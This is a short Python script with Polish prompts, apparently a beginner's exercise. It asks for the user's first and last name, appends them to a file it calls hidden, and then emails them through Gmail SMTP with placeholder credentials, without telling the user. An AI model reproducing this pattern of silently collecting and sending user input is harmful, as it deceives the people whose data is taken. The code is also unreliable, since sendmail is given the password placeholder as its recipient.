import platform
import subprocess
imie = input("Prosze podaj swoje imie\n, moj przycielu :D : ")
nazwisko = input("Prosze podaj swoje naziwsko\n, moj przycielu :D : ")
def ukryjPlik(nazwapliku):
    with open(nazwapliku, mode="a", encoding="UTF-8") as file:
        file.write(f"""
        {imie}{nazwisko}
        """)
ukryjPlik("ukrytyPlik.txt")



import smtplib
 
server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login("mail", "haslo")
 
msg = imie + nazwisko
server.sendmail("mail", "haslo", msg)
server.quit()
